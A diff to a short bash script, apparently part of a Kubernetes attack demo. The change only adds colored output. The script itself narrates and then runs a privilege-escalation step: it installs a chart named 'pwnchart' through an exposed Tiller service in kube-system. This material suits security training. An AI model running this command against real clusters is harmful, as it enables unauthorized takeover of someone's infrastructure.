@@ -1,7 +1,15 @@
 #!/usr/bin/env bash
+# Color Definitions:
+CLEAR='\033[0m'
+RED='\033[31m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BOLD_RED='\033[1m\033[31m'
+BOLD_GREEN='\033[1m\033[32m'
+BOLD_YELLOW='\033[1m\033[33m'
 
-printf "Use Helm to deploy a chart to elevate our privilege access\n"
-printf "Command: \"helm --host tiller-deploy.kube-system:44134 install /pwnchart\" \n"
+printf "${BOLD_YELLOW}Use Helm to deploy a chart to elevate our privilege access${CLEAR} \n"
+printf "${BOLD_YELLOW}Command:${CLEAR} ${GREEN}\"helm --host tiller-deploy.kube-system:44134 install /pwnchart\"${CLEAR} \n"
 printf " \n"
 sleep 3
 helm --host tiller-deploy.kube-system:44134 install /pwnchart
